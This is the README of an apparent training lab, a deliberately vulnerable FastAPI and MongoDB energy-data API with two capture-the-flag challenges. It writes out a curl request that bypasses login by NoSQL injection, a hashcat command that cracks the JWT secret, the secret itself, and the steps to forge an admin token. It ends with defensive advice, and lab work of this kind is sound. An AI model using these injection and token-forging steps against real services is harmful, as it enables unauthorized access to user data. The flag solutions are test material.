# EnergyAPI

## Description
EnergyAPI is a FastAPI service for energy data and user records, backed by MongoDB. Its authentication and search features provide a lab for studying unsafe query construction and token-based authorization.

## Vulnerability Focus
NoSQL injection through query inputs and weak JWT signing-secret configuration.

## Technology
Python, FastAPI, PyMongo, and MongoDB.

## Challenge 1 — NoSQL injection
Explore the API (Swagger is at `/docs`). `/login/` builds
`{"name": {"$regex": name}, "password": password}`, so an operator object for the
password matches any user:
```bash
curl -X POST https://energy-api.hacktraining.nl/login/ \
  -H "Content-Type: application/json" \
  -d '{"name": "Bob", "password": {"$regex": ".*"}}'
```
The response is a JWT; decode it (jwt.io) — the flag is embedded in the payload.

## Challenge 2 — JWT privilege escalation
The API signs JWTs with a weak secret. Crack it and forge an admin token to reach
the admin-only search, which dumps every user (including the *Flag* user).
```bash
hashcat -m 16500 -a 0 jwt.txt Top304Thousand-probable-v2.txt --force -O   # secret: Letmein123
# forge a token with "role":"admin" (jwt.io / CyberChef), then:
curl -H "Authorization: Bearer <forged_token>" 'https://energy-api.hacktraining.nl/search/?name=.*'
# (or /admin/)
```

## Run and Test
From this directory, start the local test environment:

```sh
docker compose -f test/docker-compose.yml up --build
```

Open <http://localhost> while the containers are running. Stop them with:

```sh
docker compose -f test/docker-compose.yml down
```

## Defensive Takeaway
Validate input types before building database queries, reject operator-shaped user input where it is not expected, and keep JWT signing secrets strong and outside source code.
